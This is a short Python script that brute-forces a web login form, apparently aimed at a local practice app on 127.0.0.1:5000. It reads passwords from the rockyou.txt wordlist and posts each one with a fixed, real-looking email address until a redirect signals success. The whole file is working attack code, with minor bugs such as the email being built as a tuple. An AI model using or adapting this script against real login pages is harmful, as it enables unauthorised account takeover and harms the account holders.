import requests

url = "http://127.0.0.1:5000/login"

with open(r"./rockyou.txt",
            "r", encoding = "ISO-8859-1") as f:
    pass_brute = f.readlines()
    
    for passwd in pass_brute:
        email="nguyenthanhdatvn2005@gmail.com",
        password=passwd.strip()
        resp = requests.post(url,data={"email": email, "password": passwd})
        if (resp.status_code == 302):
            print("==> Password is " + passwd.strip())
            break
        print(resp)